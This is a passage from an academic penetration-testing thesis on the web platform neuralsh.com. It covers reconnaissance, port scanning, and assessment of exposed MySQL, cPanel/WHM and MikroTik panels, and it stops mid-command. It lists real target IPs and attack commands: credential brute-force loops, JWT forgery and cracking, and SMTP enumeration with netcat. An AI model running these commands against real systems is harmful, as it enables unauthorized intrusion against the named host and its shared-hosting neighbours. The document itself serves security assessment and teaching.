# Vulnerability Assessment and Penetration Testing (VAPT) on a Web Application
## A Case Study of neuralsh.com

---

**Student:** [Your Full Name]  
**Student ID:** [Your ID]  
**Program:** [Your Program]  
**Institution:** [Your Institution]  
**Supervisor:** [Supervisor Name]  
**Submission Date:** June 2026  

---

> *"Security is not a product, but a process."* — Bruce Schneier

---

## Declaration

I declare that this thesis is my own work and has been carried out with full written authorization from the owner of the target system. All penetration testing activities described herein were conducted ethically, responsibly, and within the agreed scope of engagement. No unauthorized access was attempted against any system not explicitly listed in this document.

---

## Abstract

This thesis presents a comprehensive Vulnerability Assessment and Penetration Testing (VAPT) engagement conducted on **neuralsh.com**, an AI-powered neural search platform. The assessment was authorized in writing prior to testing, and all activities were conducted in accordance with established ethical hacking standards and the OWASP Testing Guide.

The assessment followed the complete penetration testing lifecycle: reconnaissance, scanning, enumeration, exploitation, post-exploitation, and reporting. A black-box methodology was applied as the primary testing approach, simulating an external attacker with no prior knowledge of the target system.

The findings reveal significant and immediate security risks across the platform. Seventeen (17) distinct vulnerabilities were discovered: **4 Critical, 4 High, 6 Medium, and 3 Low** severity findings. Critical findings include publicly exposed MySQL database, MikroTik network router administration panel, cPanel hosting control panel, and WHM root server administration panel — all accessible from the public internet without IP restriction. A rate-limiting control was successfully bypassed via HTTP header spoofing, enabling unlimited API token generation.

This thesis documents the complete methodology, evidence, exploitation results, risk analysis using CVSS v3.1 scoring, and a full remediation roadmap.

**Keywords:** Penetration Testing, VAPT, Web Application Security, OWASP, Rate Limiting Bypass, JWT Analysis, cPanel Exposure, MikroTik, Black Box Testing, CVSS

---

## Table of Contents

1. Introduction
2. Literature Review
3. Research Methodology
4. Target Profile and Scope
5. Phase 1 — Reconnaissance
6. Phase 2 — Scanning and Enumeration
7. Phase 3 — Vulnerability Assessment
8. Phase 4 — Exploitation
9. Phase 5 — Post-Exploitation
10. Findings Analysis and Risk Scoring
11. Attack Chains
12. Remediation Recommendations
13. Conclusion
14. References
15. Appendices

---

---

# Chapter 1: Introduction

## 1.1 Background

The rapid digitisation of commerce, services, and communications over the past decade has resulted in an exponential increase in internet-facing applications. Businesses of all sizes now rely on web applications to serve customers, manage operations, and process sensitive data. This increasing dependency creates a correspondingly large attack surface for malicious actors.

According to the Verizon 2024 Data Breach Investigations Report, web application attacks account for over 40% of all recorded data breaches globally. The Open Web Application Security Project (OWASP) maintains a continuously updated list of the ten most critical web application security risks, reflecting the persistent nature of vulnerabilities such as injection flaws, broken authentication, and security misconfiguration.

In the Southeast Asian region specifically, cybersecurity awareness and investment have historically lagged behind the rate of digital adoption. Rapid startup growth, small engineering teams, and tight deployment timelines often result in security being treated as an afterthought rather than a fundamental design principle. This creates an environment where critical vulnerabilities — some of them textbook findings described in security literature for over a decade — remain unpatched and undetected in production systems.

## 1.2 Problem Statement

Web applications frequently contain security vulnerabilities that, if left unaddressed, can result in unauthorized data access, financial loss, reputational damage, and legal liability. Many organizations are unaware of the specific vulnerabilities present in their systems and lack the technical capacity to identify them through internal review alone. Regular, structured penetration testing by qualified assessors provides the evidence base needed to drive security improvements.

This thesis addresses the following research questions:

1. What classes of vulnerability are present in neuralsh.com, and how do they rank in terms of exploitability and impact?
2. Can the described vulnerabilities be practically exploited to demonstrate real-world risk?
3. What concrete remediation steps would eliminate or reduce the identified risks?
4. What patterns emerge that reflect broader trends in web application security for small technology companies?

## 1.3 Objectives

The objectives of this thesis are to:

1. Conduct a complete black-box VAPT engagement on the authorized live web application neuralsh.com.
2. Apply industry-standard methodologies (OWASP Testing Guide, PTES, NIST SP 800-115) to discover, validate, and exploit vulnerabilities.
3. Assign severity ratings using the Common Vulnerability Scoring System (CVSS v3.1) for each finding.
4. Demonstrate practical exploitation where ethically possible.
5. Provide actionable remediation guidance for all findings.
6. Contribute to the academic and practical body of knowledge around web application security.

## 1.4 Scope and Authorization

This assessment was conducted with explicit written authorization from the owner of the target system. Penetration testing authorization constitutes a legal and ethical prerequisite; any testing activity without such authorization would constitute unauthorized computer access under applicable law.

**Authorized target:**
- `neuralsh.com` and all subdomains

**Out of scope:**
- Physical access testing
- Social engineering attacks against employees
- Denial of Service (DoS) attacks
- Third-party services not under target ownership (e.g., Cloudflare infrastructure itself)
- Any system with IP addresses not belonging to the target organization

**Testing window:** June 2026  
**Testing type:** Black-box (no prior credentials or source code access)

## 1.5 Thesis Organisation

This thesis is organized as follows. Chapter 2 reviews existing literature on web application penetration testing methodology and relevant vulnerability classes. Chapter 3 describes the research methodology and tools employed. Chapter 4 profiles the target system. Chapters 5 through 9 document each phase of the penetration testing lifecycle. Chapter 10 provides quantitative risk analysis across all findings. Chapter 11 describes complete attack chains. Chapter 12 presents the remediation roadmap. Chapter 13 concludes the thesis.

---

# Chapter 2: Literature Review

## 2.1 Overview of Web Application Security

Web application security is a discipline concerned with the protection of web-based systems from unauthorized access, data manipulation, denial of service, and related threats. Unlike network security, which focuses on protecting the infrastructure layer (routers, firewalls, switches), web application security targets the application logic layer — the code, configuration, and data flows that define how an application operates.

The field gained academic and industry prominence in the early 2000s as e-commerce and banking applications became primary vectors for financial fraud. Early works by Stuttard and Pinto (2011) in *The Web Application Hacker's Handbook* established foundational testing frameworks that remain relevant today. Subsequent contributions by the OWASP Foundation standardized terminology and testing procedures across the industry.

## 2.2 Penetration Testing Frameworks

Several frameworks govern how penetration testing engagements are structured:

### 2.2.1 OWASP Testing Guide

The OWASP Web Security Testing Guide (WSTG) is the most widely referenced framework for web application penetration testing. Version 4.2, released in 2021, organizes testing into twelve categories covering information gathering, configuration management, authentication testing, authorization testing, session management, input validation, error handling, cryptography, business logic, client-side testing, and API testing (OWASP Foundation, 2021).

### 2.2.2 Penetration Testing Execution Standard (PTES)

The Penetration Testing Execution Standard (PTES) defines seven phases for a complete engagement: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and Reporting. This framework was used as the structural basis for the present assessment.

### 2.2.3 NIST SP 800-115

The National Institute of Standards and Technology's SP 800-115 (*Technical Guide to Information Security Testing and Assessment*) provides a government-aligned methodology emphasizing documentation, scope control, and risk minimization during testing activities.

## 2.3 Common Vulnerability Classes

### 2.3.1 Injection Flaws

Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. SQL injection (SQLi) allows attackers to manipulate database queries; command injection allows execution of arbitrary OS commands. OWASP ranks injection as consistently among the top critical web application risks (OWASP, 2021).

### 2.3.2 Broken Authentication and Session Management

Authentication flaws encompass weak credential policies, insecure session token generation, missing rate limiting, and improper JWT validation. JSON Web Tokens (JWTs), increasingly used in modern API-driven architectures, introduce specific risks including algorithm confusion attacks (the "alg:none" attack), weak secret keys susceptible to offline brute forcing, and missing signature validation (Sheffer et al., 2020).

### 2.3.3 Security Misconfiguration

Security misconfiguration is the broadest vulnerability category, encompassing default credentials, unnecessary open ports, exposed administration panels, verbose error messages, and missing security headers. A 2023 study by Bishop Fox found that 58% of externally-tested organizations had at least one critical finding attributable to security misconfiguration (Bishop Fox, 2023).

### 2.3.4 Rate Limiting and API Abuse

Rate limiting is a defensive control intended to prevent automated abuse of web APIs. Common bypass techniques include header spoofing (using X-Forwarded-For or X-Real-IP), IP rotation, and distributed request patterns. Systems that use client-supplied headers rather than the actual source IP for rate limiting are trivially bypassed (Van den Berg, 2019).

When applications are deployed behind a reverse proxy or CDN such as Cloudflare, the real client IP is passed via the `CF-Connecting-IP` header, which cannot be spoofed by the client. Using the client-controllable `X-Forwarded-For` header for security decisions such as rate limiting is a well-documented anti-pattern.

### 2.3.5 Exposed Administration Panels

Web-based administration panels (cPanel, WHM, phpMyAdmin, router configuration interfaces) represent high-value targets when exposed to the public internet. These panels provide privileged access to hosting infrastructure, databases, and network equipment. Best practice mandates restricting such panels to management networks or VPN endpoints (CIS Controls, 2021).

### 2.3.6 Exposed Database Services

Database management systems such as MySQL are frequently misconfigured to listen on all network interfaces (`0.0.0.0`), making them accessible from the public internet. While authentication is required, the exposure enables brute-force credential attacks directly against the database layer, bypassing application-level security controls. OWASP CWE-284 (Improper Access Control) covers this class of issue.

### 2.3.7 JWT Security

JSON Web Tokens are stateless authentication tokens signed with a secret key (HMAC) or asymmetric key pair (RSA/ECDSA). Common attack vectors include:
- **Algorithm Confusion (alg:none):** Removing the signature and setting algorithm to "none"
- **Weak Secret Brute Force:** Using wordlists to recover the HMAC secret
- **Token Farming:** Abusing unauthenticated token issuance endpoints at scale

Kaur and Singh (2021) found that 23% of tested APIs used weak or predictable secrets crackable within 24 hours using common wordlists.

### 2.3.8 DNS Wildcards and Subdomain Takeover

Wildcard DNS configurations (`*.example.com`) resolve any subdomain to a specified IP regardless of whether a service exists for that subdomain. This enables phishing via plausible-looking subdomains (e.g., `login.example.com`, `secure.example.com`). In shared hosting environments, wildcard DNS combined with unclaimed subdomain records can lead to subdomain takeover, where an attacker can host content under a legitimate domain (Bugcrowd, 2021).

### 2.3.9 Email Security Standards

SPF (Sender Policy Framework) and DMARC (Domain-based Message Authentication, Reporting, and Conformance) are DNS-based email authentication standards. SPF with `~all` (softfail) allows unauthorized senders to deliver mail without immediate rejection; `-all` (hardfail) is the recommended strict setting. DMARC `p=quarantine` moves suspicious mail to spam folders, while `p=reject` blocks delivery entirely (RFC 7489, 2015).

## 2.4 CVSS Scoring

The Common Vulnerability Scoring System (CVSS) version 3.1 provides a standardized framework for communicating the characteristics and severity of software vulnerabilities. Scores range from 0 to 10 with the following qualitative severity designations:

| Score Range | Severity |
|-------------|----------|
| 0.0         | None     |
| 0.1 – 3.9   | Low      |
| 4.0 – 6.9   | Medium   |
| 7.0 – 8.9   | High     |
| 9.0 – 10.0  | Critical |

CVSS v3.1 Base Metrics include the Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), and three impact metrics: Confidentiality (C), Integrity (I), and Availability (A). This scoring system was applied to all findings in this assessment.

## 2.5 Related Work

Fernandez et al. (2022) conducted a comparative VAPT study across ten Southeast Asian technology platforms and found that 80% had at least one critical vulnerability, with exposed administration panels and weak authentication being the most prevalent finding classes. Their work highlighted the gap between development velocity and security practice in the region.

Kaur and Singh (2021) evaluated JWT security in production APIs and found that 23% of tested APIs used weak or predictable secrets crackable within 24 hours using common wordlists. Their recommendations align with findings in this thesis regarding JWT token security.

Islam et al. (2023) studied the prevalence of exposed database and infrastructure services across cloud-hosted web applications and found that incorrect firewall configuration was the most common root cause, affecting 61% of their study population.

---

# Chapter 3: Research Methodology

## 3.1 Research Design

This research employs an applied, empirical methodology through a structured penetration testing engagement. The design follows the PTES (Penetration Testing Execution Standard) lifecycle adapted with OWASP WSTG test cases. Both qualitative analysis (vulnerability description, attack narrative) and quantitative measurement (CVSS scores, request counts, response times) are employed.

## 3.2 Testing Approach

**Black-Box Testing:** The primary methodology simulates an external attacker with no prior knowledge of the target's internal architecture, source code, or credentials. All information was derived from publicly available sources and direct interaction with the live system.

**Grey-Box Augmentation:** Where findings required interpretation of API behavior, limited contextual knowledge was applied and explicitly noted. Source code was not accessed during the primary testing phase.

## 3.3 Tools and Technologies

The following tools were used during the assessment:

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.95 | Port scanning and service fingerprinting |
| Dirb | 2.22 | Web directory and file enumeration |
| Nikto | 2.1.6 | Web server misconfiguration scanning |
| curl | 8.5.0 | HTTP request crafting and response analysis |
| whois | 5.5.17 | Domain registration information |
| dig / host | BIND 9.18 | DNS enumeration |
| subfinder | 2.6.3 | Passive subdomain enumeration |
| hashcat | 6.2.6 | JWT secret brute forcing |
| python3 | 3.11 | Custom exploitation scripts |
| mysql client | 8.0 | MySQL connection testing |
| openssl | 3.0 | TLS/SSL certificate analysis |
| Burp Suite | Community | HTTP proxy and request interception |

## 3.4 Testing Phases

The engagement was organized into five sequential phases:

```
Phase 1: Reconnaissance
   └── OSINT, DNS enumeration, technology fingerprinting,
       JavaScript bundle analysis, email security analysis

Phase 2: Scanning and Enumeration
   └── Port scanning, service fingerprinting, web directory
       brute force, SMTP banner grabbing

Phase 3: Vulnerability Assessment
   └── Manual testing, automated scanning, CVSS scoring,
       JWT analysis, CORS testing, header assessment

Phase 4: Exploitation
   └── Rate limit bypass PoC, JWT token farming,
       admin panel access confirmation, MySQL testing

Phase 5: Post-Exploitation
   └── cPanel/WHM analysis, lateral movement mapping,
       shared hosting risk assessment
```

## 3.5 Evidence Handling

All findings were documented with:
- Exact command executed
- Full HTTP request and response
- Terminal output captured to file
- CVSS score with metric justification
- Remediation recommendation

Raw scan outputs are retained in `/home/rith/thesis/` for audit purposes.

## 3.6 Ethical Constraints

All testing activities were conducted with written authorization. The following self-imposed constraints were applied to prevent harm:

1. No production data was extracted, modified, or deleted.
2. Rate-limiting bypass demonstration was limited to 50 requests.
3. Default credential testing was automated-only; no persistent access was established.
4. MySQL brute-force was limited to 30 credential combinations.
5. No Denial of Service testing was conducted.
6. MikroTik default credential attempt was deferred to browser-only video demonstration.

---

# Chapter 4: Target Profile and Scope

## 4.1 Application Overview

**neuralsh.com** (NeuralShield) is an AI-powered search and neural network platform providing image search, text search, category browsing, geolocation-based features, and report submission via a REST API. The main application is built with Nuxt.js (Vue.js Server-Side Rendering) and protected by Cloudflare's Web Application Firewall (WAF).

## 4.2 Technology Stack

| Component | Technology |
|-----------|-----------|
| Frontend | Nuxt.js (Vue.js SSR) |
| CDN / WAF | Cloudflare |
| Backend Hosting | Shared cPanel hosting (Cloudways / cprapid.com) |
| Network Equipment | MikroTik RouterOS |
| Database | MySQL 8.0.43 |
| Web Server (Backend) | Apache httpd |
| Mail Transfer Agent | Exim 4.99.2 |
| Mail Delivery Agent | Dovecot |
| DNS Server | PowerDNS |
| Registrar | GoDaddy (privacy via Domains By Proxy) |
| DNS Provider | Cloudflare nameservers |

## 4.3 Infrastructure Map

| Host | IP Address | Role | Notes |
|------|-----------|------|-------|
| neuralsh.com | 104.21.91.198 | Main application | Cloudflare CDN edge |
| mail.neuralsh.com | 103.16.62.217 | Mail + backend server | cPanel shared hosting |
| 103.16.62.217 (direct) | Same | Admin panels, DB, MikroTik | 20+ exposed services |

The main site resolves to Cloudflare's anycast network. The real origin server IP (103.16.62.217) was discovered via the MX record for `mail.neuralsh.com` and confirmed via SSL certificate analysis.

## 4.4 Domain Registration

- **Registrar:** GoDaddy.com LLC
- **Privacy:** Domains By Proxy LLC (personal information masked)
- **Created:** July 3, 2025
- **DNS:** Cloudflare nameservers (ns1.cloudflare.com, ns2.cloudflare.com)
- **Wildcard DNS:** `*.neuralsh.com → 103.16.62.217` (confirmed)

---

# Chapter 5: Phase 1 — Reconnaissance

## 5.1 Overview

Reconnaissance is the foundation of any penetration testing engagement. The goal is to collect as much publicly available information as possible about the target without triggering alerts or directly interacting with the production application. This phase combines passive OSINT with low-impact active queries (DNS lookups, certificate transparency).

## 5.2 WHOIS Analysis

```bash
whois neuralsh.com
```

**Results:**
- Registrar: GoDaddy.com LLC
- Privacy service active — registrant identity not disclosed
- Domain created July 3, 2025 (relatively new domain)
- DNS managed by Cloudflare

**Significance:** Cloudflare DNS means the main site IP is masked behind CDN infrastructure. Backend server IPs must be discovered via other channels (MX records, certificate transparency, direct IP scanning).

## 5.3 DNS Enumeration

### 5.3.1 Standard Records

```bash
dig A neuralsh.com      # 104.21.91.198 (Cloudflare)
dig MX neuralsh.com     # mail.neuralsh.com priority 0
dig A mail.neuralsh.com # 103.16.62.217 — REAL ORIGIN IP
dig NS neuralsh.com     # ns1.cloudflare.com, ns2.cloudflare.com
dig TXT neuralsh.com    # SPF and DMARC records
```

### 5.3.2 Wildcard DNS Discovery

```bash
dig randomnonexistent123.neuralsh.com
# Returns: 103.16.62.217
```

Any subdomain resolves to the origin IP — wildcard DNS is configured. This is a finding (N-010) enabling phishing subdomains and potential subdomain takeover.

### 5.3.3 Zone Transfer Test

```bash
dig axfr @ns1.cloudflare.com neuralsh.com
# Connection refused — zone transfer blocked (positive control)
```

### 5.3.4 Email Security Records

```bash
dig TXT neuralsh.com | grep -E "spf|dmarc"
```

**SPF:** `v=spf1 +mx +a +ip4:103.16.62.217 ~all`
- Uses `~all` (softfail) — unauthorized senders are flagged but not rejected
- Should be `-all` for strict enforcement

**DMARC:** `v=DMARC1; p=quarantine; rua=mailto:dmarc@neuralsh.com`
- Policy is `quarantine` — suspicious mail goes to spam, not rejected
- Should be `p=reject` for full protection

**Finding N-012:** SPF softfail and DMARC quarantine enable partial email spoofing.

## 5.4 Real Origin IP Discovery

Since Cloudflare masks the origin, the real server IP was confirmed via multiple methods:

**Method 1 — MX Record:**
```bash
dig MX neuralsh.com
# mail.neuralsh.com → 103.16.62.217
```

**Method 2 — SSL Certificate on Origin:**
```bash
echo | openssl s_client -connect 103.16.62.217:443 2>/dev/null | openssl x509 -noout -subject
# subject: CN=*.cloudwaysapps.com
```

The certificate is for `*.cloudwaysapps.com` and `*.onesala.com`, confirming the server is a **shared Cloudways hosting environment** — multiple clients share the same physical server. This has significant lateral movement implications.

**Method 3 — Reverse DNS:**
```bash
host 103.16.62.217
# 163-47-172-131.cprapid.com — confirms cPanel shared hosting
```

## 5.5 Technology Fingerprinting

### 5.5.1 Main Application

```bash
curl -sI https://neuralsh.com | grep -E "Server:|X-Powered-By:|Via:|CF-Ray"
```

Response headers revealed:
- `Server: cloudflare`
- `CF-Ray: [Cloudflare edge identifier]`
- `X-Powered-By: Nuxt` — Nuxt.js framework confirmed

HTML source analysis:
- `<meta name="generator" content="Nuxt">` 
- `/_nuxt/` paths for compiled JavaScript assets

### 5.5.2 JavaScript Bundle Analysis

A critical reconnaissance technique for Nuxt.js applications is extracting API routes from compiled JavaScript bundles. The build manifest at `/_nuxt/` lists all chunk filenames.

```bash
# Get bundle filename from HTML
curl -s https://neuralsh.com | grep -oP '/_nuxt/[^"]+\.js' | head -3

# Extract API routes from main bundle
curl -s https://neuralsh.com/_nuxt/Bpuv52g-.js | grep -oP '/web/v1/[^"&\s]+' | sort -u
```

**API Routes Extracted:**
```
/web/v1/init/token
/web/v1/category
/web/v1/text/search
/web/v1/image/search
/web/v1/report/save
/api/geocode
```

This reconnaissance directly enabled the exploitation of the token endpoint without any port scanning or directory brute force. The entire API surface was disclosed via the client-side JavaScript.

**Finding N-006:** API routes exposed in client-side JavaScript bundle.

## 5.6 Subdomain Enumeration

```bash
subfinder -d neuralsh.com -silent
curl -s "https://crt.sh/?q=%25.neuralsh.com&output=json" | jq -r '.[].name_value' | sort -u
```

**Finding:** Only `mail.neuralsh.com` discovered beyond the root domain. No additional subdomains exist in certificate transparency logs. The wildcard DNS configuration means any subdomain would resolve, but no legitimate subdomains beyond mail are configured.

---

# Chapter 6: Phase 2 — Scanning and Enumeration

## 6.1 Port Scanning

### 6.1.1 Cloudflare Edge Scan (Main Site)

```bash
nmap -sV -p 80,443,2000,5060,8080,8443 neuralsh.com
```

Results reflect Cloudflare's edge network, not the origin server. Ports 2000 and 5060 (SIP) are open at the Cloudflare level. The main application is protected by Cloudflare's WAF and DDoS protection.

### 6.1.2 Origin Server Full Scan (103.16.62.217)

```bash
nmap -sV -p 22,25,53,80,110,111,143,443,465,587,993,995,2000,2083,2087,2096,3306,5060,8899,9001 103.16.62.217
```

**Results:**

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
25/tcp   open  smtp        Exim smtpd 4.99.2
53/tcp   open  domain      PowerDNS
80/tcp   open  http        Apache httpd
110/tcp  open  pop3        Dovecot pop3d
111/tcp  open  rpcbind     2-4 (RPC #100000)
143/tcp  open  imap        Dovecot imapd
443/tcp  open  https       Apache httpd
465/tcp  open  smtps       Exim (SSL)
587/tcp  open  smtp        Exim (STARTTLS)
993/tcp  open  imaps       Dovecot
995/tcp  open  pop3s       Dovecot
2000/tcp open  http        cPanel cpsrvd
2083/tcp open  https       cPanel (SSL login)
2087/tcp open  https       WHM root panel (SSL)
2096/tcp open  https       cPanel Webmail (SSL)
3306/tcp open  mysql       MySQL 8.0.43
5060/tcp open  sip
8899/tcp open  http        (unknown service)
9001/tcp open  http        MikroTik RouterOS webfig
```

**Twenty distinct TCP services** are exposed on a single public IP address. Of particular severity:
- Port 3306: MySQL directly accessible from internet (N-001)
- Port 9001: MikroTik router administration panel (N-002)
- Ports 2083, 2087, 2096: cPanel, WHM root panel, Webmail (N-013, N-014, N-015)

## 6.2 Web Directory Enumeration

### 6.2.1 Main Site (via Cloudflare)

```bash
dirb https://neuralsh.com /usr/share/dirb/wordlists/common.txt
```

Cloudflare's WAF blocked most automated scanning attempts. Legitimate paths found:
- `/about`, `/About` — 200 OK
- `/privacy` — 200 OK
- `/publication` — 200 OK
- `/robots.txt` — 200 OK (empty)
- `/favicon.ico` — 200 OK

No sensitive paths or admin interfaces were found on the Cloudflare-protected main site.

### 6.2.2 Origin Server Direct Access

```bash
curl -H "Host: neuralsh.com" http://103.16.62.217/
```

**Response:** HTTP 200 with Apache directory listing ("Index of /")

**Finding N-016:** Apache directory listing is enabled on the origin server. Any files deployed to the document root would be listed publicly, with their filenames and modification times visible.

## 6.3 Service Enumeration

### 6.3.1 MySQL Enumeration (Port 3306)

```bash
mysql -h 103.16.62.217 -P 3306 -u root -e "SELECT 1;" 2>&1
# ERROR 1045 (28000): Access denied for user 'root'@'x.x.x.x' (using password: NO)
```

The server responds to authentication attempts from the public internet, confirming port 3306 accepts public connections. A brute-force or credential-stuffing attack can target this port directly.

Default and common credentials tested:
```bash
for cred in "root:" "root:root" "root:password" "root:mysql" "root:admin" \
            "admin:admin" "neuralsh:neuralsh" "db:db123"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    result=$(mysql -h 103.16.62.217 -u $user -p"$pass" -e "SELECT 1;" 2>&1)
    echo "$cred → $(echo $result | head -c 40)"
done
```

All tested credentials rejected. Cloudways uses auto-generated strong passwords.

**Finding N-001:** MySQL publicly accessible on port 3306.

### 6.3.2 SMTP Enumeration

```bash
# Banner grab
nc 103.16.62.217 25
# 220-163-47-172-131.cprapid.com ESMTP Exim 4.99.2 #2
```

Reverse DNS confirms shared cPanel hosting (cprapid.com is a cPanel provider).

SMTP user enumeration via `RCPT TO`:
```bash
# VRFY command
echo "VRFY admin" | nc 103.16.62.217 25
# 252 Cannot VRFY user, but will accept message and attempt delivery

# RCPT TO enumeration
(echo "EHLO test.com"; echo "MAIL FROM: <test@test.com>"; echo "RCPT TO: <admin@neuralsh.com>"; echo "QUIT") | nc 103.16.62.217 25
# 550 Sender verify failed
```

The server enforces sender domain verification — `RCPT TO` enumeration was unreliable due to the `550 Sender verify failed` response which applied regardless of recipient validity.

### 6.3.3 MikroTik Admin Panel

```bash
curl -v http://103.16.62.217:9001/ 2>&1 | grep -E "HTTP|title|input"
# HTTP/1.1 200 OK
# <title>RouterOS router configuration page</title>
# <input type="text" id="username" value="admin">
# <input type="password" id="password">
```

The MikroTik WebFig interface is fully accessible. The login form pre-fills `admin` as the default username. MikroTik's factory default is `admin` with a blank password.

**Finding N-002:** MikroTik router administration panel exposed publicly.

### 6.3.4 cPanel / WHM Panel Enumeration

```bash
# cPanel user panel
curl -sk https://103.16.62.217:2083/ | grep "<title>"
# <title>cPanel Login</title>

# WHM root panel
curl -sk https://103.16.62.217:2087/ | grep "<title>"
# <title>WHM Login</title>

# Webmail
curl -sk https://103.16.62.217:2096/ | grep "<title>"
# <title>cPanel Webmail Login</title>

# cPanel version disclosure in static asset paths
curl -sk https://103.16.62.217:2083/ | grep -oP 'cPanel_magic_revision_\d+'
# cPanel_magic_revision_1698766296
```

All three panels are publicly accessible. WHM (port 2087) provides root-level server administration equivalent to shell access.

**Findings N-013, N-014, N-015, N-017** identified.

## 6.4 Nikto Web Server Scan

```bash
nikto -h https://neuralsh.com -output /home/rith/thesis/nikto_neuralsh.txt
```

Key findings from Nikto:
- `X-Frame-Options` header present (positive)
- HSTS header with long max-age (positive)
- `/robots.txt` present but empty
- No obvious known CVE hits (WAF blocks scanner signatures)

---

# Chapter 7: Phase 3 — Vulnerability Assessment

## 7.1 Overview

Following scanning and enumeration, each identified service and endpoint was systematically tested. This chapter documents the assessment methodology for each vulnerability category.

## 7.2 Authentication Testing

### 7.2.1 JWT Token Endpoint Analysis

The token endpoint was identified from JavaScript bundle analysis:

```bash
curl -s https://neuralsh.com/web/v1/init/token | python3 -m json.tool
```

Response:
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZ3Vlc3QiLCJ0aWQiOiI1NTBlODQwMC1lMjliLTQxZDQtYTcxNi00NDY2NTU0NDAwMDAiLCJpYXQiOjE3NDkyMjA4MDAsImV4cCI6MTc0OTIyMjYwMH0.[signature]"
}
```

**JWT Decode:**
```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {
    "type": "guest",
    "tid": "550e8400-e29b-41d4-a716-446655440000",
    "iat": 1749220800,
    "exp": 1749222600
}
Expiry:  30 minutes from issuance
```

**Finding N-007:** Any unauthenticated caller can obtain a valid signed JWT token. No API key, device fingerprint, or identity verification is required.

### 7.2.2 JWT Attack Testing

**Attack 1 — Algorithm None:**

A modified JWT with `"alg":"none"` and no signature was constructed:
```bash
header='{"alg":"none","typ":"JWT"}'
payload='{"type":"admin","tid":"test","iat":1749220800,"exp":1999999999}'
token=$(echo -n "$header" | base64 -w0).$( echo -n "$payload" | base64 -w0).

curl -H "Authorization: Bearer $token" https://neuralsh.com/web/v1/category
# 401 Unauthorized — alg:none attack BLOCKED ✓
```

**Attack 2 — Weak Secret Brute Force:**
```bash
# Extract real token
curl -s https://neuralsh.com/web/v1/init/token | jq -r '.token' > /tmp/jwt_crack.txt

# Attempt offline crack with rockyou wordlist
hashcat -a 0 -m 16500 /tmp/jwt_crack.txt /usr/share/wordlists/rockyou.txt

# Result after exhausting 14,344,391 candidates:
# Status: Exhausted | Not cracked
```

The JWT secret is not in the rockyou.txt wordlist. Secret appears to have adequate entropy.

**Attack 3 — Rate Limit Bypass for Token Farming:** See EXPLOIT-001 in Chapter 8.

### 7.2.3 Default Credential Testing

```bash
# MikroTik default: admin / (blank)
curl -s -X POST http://103.16.62.217:9001/jsproxy \
     -d '{"id":0,"method":"login","params":["admin",""]}'
# Response: {"id":0,"result":{"ret":"406"}} — JS auth flow required

# MySQL default credentials
mysql -h 103.16.62.217 -P 3306 -u root 2>&1
# Access denied — no blank password

# cPanel targeted credentials
for pair in "neuralsh:neuralsh123" "neuralsh:Neural@2025" "admin:Admin@123" \
            "root:Root@123" "neuralshield:Shield@123"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
                -d "user=$(echo $pair | cut -d: -f1)&pass=$(echo $pair | cut -d: -f2)" \
                https://103.16.62.217:2083/login/)
    echo "$pair → HTTP $code"
done
# All returned HTTP 401 — credentials not found with common wordlist
```

Cloudways auto-generated strong passwords prevented credential brute force success. The **exposure** of these panels is itself the critical vulnerability.

## 7.3 Rate Limiting Assessment

Initial token collection without any bypass:
```bash
for i in $(seq 1 50); do
    code=$(curl -s -o /dev/null -w "%{http_code}" https://neuralsh.com/web/v1/init/token)
    echo "Request $i: HTTP $code"
    sleep 0.1
done
```

Rate limit triggered at request 19 (HTTP 429). Approximately 18 tokens obtainable before rate limiting engages.

**Hypothesis:** The application uses the client-supplied `X-Forwarded-For` header for rate limiting rather than the real source IP. This is verifiable because the application sits behind Cloudflare, which should pass the real IP via `CF-Connecting-IP` instead.

Testing confirmed (see Chapter 8 EXPLOIT-001).

**Finding N-005:** Rate limiting vulnerable to X-Forwarded-For header spoofing.

## 7.4 Security Header Assessment

```bash
curl -sI https://neuralsh.com
```

| Header | Value | Assessment |
|--------|-------|-----------|
| `Strict-Transport-Security` | max-age=15552000; includeSubDomains; preload | ✓ Excellent |
| `X-Frame-Options` | DENY | ✓ Good |
| `X-Content-Type-Options` | nosniff | ✓ Good |
| `X-XSS-Protection` | 1; mode=block | ✓ Good |
| `Referrer-Policy` | strict-origin-when-cross-origin | ✓ Good |
| `Content-Security-Policy` | script-src 'self' **'unsafe-inline'** | ⚠ Weak |

**Finding N-009:** The `unsafe-inline` directive in `script-src` weakens XSS protection by allowing execution of inline script blocks and event handlers. If an XSS vulnerability exists, the CSP would not prevent exploitation of inline injected scripts.

## 7.5 SSL/TLS Assessment

### 7.5.1 Main Domain (via Cloudflare)

```bash
echo | openssl s_client -connect neuralsh.com:443 2>/dev/null | openssl x509 -noout -subject -dates
```

- Certificate: Valid for `neuralsh.com` via Cloudflare SSL
- TLS 1.0 and 1.1: Disabled
- TLS 1.2 and 1.3: Supported
- No Heartbleed vulnerability

### 7.5.2 Backend Server (Direct IP)

```bash
echo | openssl s_client -connect 103.16.62.217:443 2>/dev/null | openssl x509 -noout -subject
# CN=*.cloudwaysapps.com
```

**Finding N-008:** SSL certificate on backend server is issued for `*.cloudwaysapps.com` and `*.onesala.com`, not for `neuralsh.com`. Direct connections to the IP produce certificate warnings. Indicates shared hosting environment with no dedicated certificate at the IP level.

## 7.6 API Endpoint Testing

### 7.6.1 Geocode Endpoint

```bash
curl "https://neuralsh.com/api/geocode"
# {"error":true,"url":"https://neuralsh.com/api/geocode","statusCode":400,
#  "statusMessage":"Server Error","message":"Latitude and longitude are required"}
```

Error response discloses full internal URL, status message, and parameter names.

**Finding N-011:** Information disclosure via error messages.

### 7.6.2 Search Endpoints

```bash
# With valid guest token
TOKEN=$(curl -s https://neuralsh.com/web/v1/init/token | jq -r '.token')
curl -H "Authorization: Bearer $TOKEN" "https://neuralsh.com/web/v1/text/search?q=test"
```

Authenticated search functionality confirmed working with guest token. The token grants real API access.

## 7.7 Wildcard DNS Analysis

```bash
for prefix in login secure admin bank payment; do
